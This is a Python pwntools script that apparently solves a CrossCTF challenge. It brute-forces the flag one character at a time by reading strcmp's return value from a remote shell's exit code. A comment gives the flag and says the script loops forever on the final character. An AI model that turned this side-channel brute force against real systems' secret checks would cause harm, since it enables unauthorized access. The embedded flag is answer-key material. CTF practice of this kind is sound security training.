from pwn import *


allowed = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_abcdefghijklmnopqrstuvwxyz{}"
allowed_len = len(allowed)

MIN = 0
MAX = len(allowed)

correct_flag = "CrossCTF{"

x=0
while (True):
	r = remote('ctf.pwn.sg', 1601)
	r.recvuntil('Flag: ')
	str_to_test = correct_flag + allowed[x]
	print "Testing: " + str_to_test
	r.sendline(str_to_test)
	r.recvuntil('Shell: ')
	r.sendline('$?')
	strcmp_val_str = r.recvuntil('\n')
	print strcmp_val_str
	strcmp_val = int(strcmp_val_str[:-1])
	print "Returned: " + str(strcmp_val)
	r.close()
	if(0 < strcmp_val <= 127): #+ve means the previous character was correct
		x = (x+1) % MAX
	elif(strcmp_val > 127): #-ve means the character is not yet correct
		correct_flag += allowed[x-1]
		print "Found: " + allowed[x-1]
		x = 0
	else:
		break
		
correct_flag += allowed[x]
print "Flag: " + correct_flag

# The flag is `CrossCTF{I_just_want_someone_to_say_to_me}`, but somehow this script will just solve the flag until `CrossCTF{I_just_want_someone_to_say_to_me` and then be stuck in an infinite loop. I don't know why when it tests `CrossCTF{I_just_want_someone_to_say_to_me}`, strcmp returns 10 instead of 0 either. I got the inspiration from https://0xcd80.wordpress.com/2011/02/10/how-strcmp-made-my-week-2/
